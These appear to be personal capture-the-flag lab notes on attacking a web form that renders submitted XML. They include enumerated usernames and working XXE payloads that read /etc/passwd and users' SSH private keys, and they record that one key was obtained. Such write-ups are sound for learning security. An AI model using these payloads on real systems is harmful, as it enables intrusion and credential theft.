the form seems to send a response of rendered xml

```
xml=%3C%3Fphp+phpinfo%28+%29%3B+%3F%3E
```

```
<!-- Barry, you can now SSH in using your key!-->
```

```
<script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
```


```
http://10.10.32.158:8765/auth/dontforget.bak
```

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment> 
```

possible users

```
admin
barry
clad
joe
hamd
```


when we paste the message into the form, it renders the xml as a comment

![[demo xml pre.png]]

![[demo xml post.png]]


crafting a malicious palyload

https://portswigger.net/web-security/xxe


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

and we can see /etc/passwd

![[etc passwd.png]]

system users

```
joe
barry
```

looking for ssh keys


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/joe/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```


![[barry priv key.png]]